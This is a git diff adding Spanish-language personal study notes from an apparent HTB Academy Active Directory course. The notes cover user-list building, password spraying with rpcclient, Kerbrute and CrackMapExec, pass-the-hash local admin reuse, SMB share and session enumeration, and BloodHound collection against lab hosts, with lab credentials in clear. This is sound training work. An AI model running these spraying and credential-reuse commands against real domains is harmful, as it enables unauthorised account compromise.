@@ -428,18 +428,244 @@ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 ```
 
 
+### Crear lista apartir de lo que nos dio Kerbrute
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/ce33afed-2ec5-4887-ae39-7eea9d6de6a0)
+
+Entonces necesitamos solo el usuario vamos a usar la consola
+
+```
+cat valid_users.txt | awk -F "VALID USERNAME:" '{print $2}' > valid_users2.txt
+
+Puedes usar este comando para borrar todos los espacio o bien mete un espacio antes del /g para que remplace todos los espacion solo por 1 asi sed 's/ \+/ /g' 
+sed 's/ \+//g' valid_users2.txt > valid_users3.txt # Este remplaza todos los espacios los elimna 
+#Finalmente para solo quedarnos con los usuarios
+cat valid_users3.txt | awk -F "@" '{print $1}'
+
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/657c1eee-1fb6-4c6b-979e-88bde60bcaaf)
+
+
+### RPCLIENT para password Spray
+
+> Una vez que hayamos creado una lista de palabras usando uno de los métodos mostrados en la sección anterior, es hora de ejecutar el ataque. Rpcclientes una excelente opción para realizar este ataque desde Linux. Una consideración importante es que un inicio de sesión válido no es evidente de inmediato con rpcclient, y la respuesta Authority Nameindica un inicio de sesión exitoso. Podemos filtrar los intentos de inicio de sesión no válidos mediante greppingfor Authorityen la respuesta. La siguiente frase breve de Bash (adaptada de aquí ) se puede utilizar para realizar el ataque.
+
+```
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/278d64c5-f9cf-41d1-a69c-d5fb9ad3a4b3)
+
+
+Con Kerbrute intente hacer el password spray pero no me dio ningun resultado no se porque
+
+```
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+```
+
+Sin embargo con cme si
+
+```
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+Y nos dio un resultado
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
+```
+
+### Reutilización de contraseña de administrador local
+
+Prueba este tipo de ataque la reutilizacion de credenciales de administrador local.
+
+```
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+```
+
+## Windows defender
+
+Para ver si el AV esta activado usa
+
+```
+Get-MpComputerStatus
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/1ae0bd13-5b9a-4e07-8d2c-309db898e733)
+
+
+## AppLocker
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/86c6488e-1429-45ae-9639-465501542ffb)
+
+
+```
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/24929d78-d2a0-4478-ab60-42752a1d68ac)
+
+## PowerShell Constrained Language Mode
+
+Otra proteccion es como una shell limitada para ver en que tipo de PS estas usa 
+
+```
+$ExecutionContext.SessionState.LanguageMode
+
+```
+
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/da2491c7-9c00-4aa0-aeef-5ad069b92b47)
 
 
 
 
+## LAPS
+
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/10c69035-c0fb-46ba-ab60-9edc47de54f2)
+
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/09d68b69-30ca-4eaa-a76c-dd93a4a563e3)
+
+
+> The Find-AdmPwdExtendedRights checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.
+
+
+Esto es algo que tienes que checar ( no lo entiendo de mas)
+
+## Enum AD with CME
+
+Recuerda que necesitas credenciales ademas CME te dice cuantos intentos le quedan a cada usuario ( badpwdcount: 0 ) Para que solo uses esas.
+
+```
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+```
+
+Para enumerar los grupos 
+
+```
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+```
+
+Te dice los usuarios que tiene cada grupo 
+
+```
+sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+
+```
+
+Para usuarios conectados y encontramos que para una maquina es administrador local
+
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/19d97fb2-b8d1-4d9e-b856-015cf0b70bc6)
+
+
+Enumerar shares del controlador de dominio
+
+```
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+```
+
+## SQLMAP
+
+Otra opcion para enumerar los shares
+
+
+```
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+```
+
+
+Este comando es importante porque nso dice los permisos que tiene
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/e22c2bf4-5887-4fe1-8377-4ca86a54568a)
+
+
+```
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+
+```
+
+## RPCLIENT
+
+Debido a las sesiones SMB NULL (que se tratan en profundidad en las secciones de distribución de contraseñas) en algunos de nuestros hosts, podemos realizar enumeraciones autenticadas o no autenticadas usando rpcclient en el dominio INLANEFREIGHT.LOCAL. Un ejemplo de uso de rpcclient desde un punto de vista no autenticado (si esta configuración existe en nuestro dominio de destino) sería
 
 
 
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/2b42aaf7-ab0c-4cf7-86ab-32104c5a3ab5)
 
 
+Para enumerar sessiones nulas osea sin autenticar
+
+```
+rpcclient -U "" -N 172.16.5.5
+```
 
 
+## Impacket Toolkit
 
+Ya sabes tiene para WinRM, PsExe y wmiexec ya lo documentaste en OSP notes.
+
+## BloodHound
+
+> The tool consists of two parts: the SharpHound collector written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an ingestor) and the BloodHound GUI tool which allows us to upload collected data in the form of JSON files.
+
+
+> Inicialmente solo se lanzó con un recopilador de PowerShell, por lo que tuvo que ejecutarse desde un host de Windows. Finalmente, un miembro de la comunidad lanzó una adaptación de Python (que requiere Impacket, ldap3y ). dnspythonEsto fue de gran ayuda durante las pruebas de penetración cuando tenemos credenciales de dominio válidas, pero no tenemos derechos para acceder a un host de Windows unido al dominio o no tenemos un host de ataque de Windows desde el cual ejecutar el recopilador SharpHound.
+
+
+```
+ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
+# Esto ejecuto el colector ahora vamos con la otra parte
+
+sudo neo4j startn # Para inciar el servico de la base de datos
+
+# activamos la gui
+
+bloodhound
+
+#Passwords por defecto
+
+username: neo4j
+password: neo4j
+```
+>https://www.kali.org/tools/bloodhound/
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/aae297ad-8c43-4c05-9c2e-6b43fd762217)
+
+Lee lo que dice la primera vez tienes que ir a esa direccion y cambias las contraseñas por defecto 
+
+### sudo apt remove vs auto-remove
+
+Este sirve para desinstalar un paquete especifico
+
+```
+sudo apt remove
+```
+
+ Este comando se utiliza para eliminar automáticamente los paquetes huérfanos o dependencias no utilizadas que quedaron en el sistema después de la eliminación de un paquete. Los paquetes huérfanos son aquellos que ya no son necesarios porque el paquete que los requería ha sido eliminado.
+
+```
+sudo apt autoremove paquete
+```
+
+Desinstala un paquete de software específico.
+Elimina todos los archivos de configuración del paquete del sistema.
+Útil cuando deseas eliminar completamente un paquete y todas sus configuraciones, lo que puede ser útil si no planeas volver a instalar el paquete o si deseas eliminar todos los rastros de él en el sistema
+
+```
+sudo apt purge bloodhound
+```
+
+## GTOBINS pero de comandos para AD
+
+> https://wadcoms.github.io/
+
+Cert de AD
+
+> https://www.alteredsecurity.com/adlab
+
+> https://www.alteredsecurity.com/adlab
+
+>  https://www.alteredsecurity.com/post/certified-red-team-professional-crtp
 
 
 
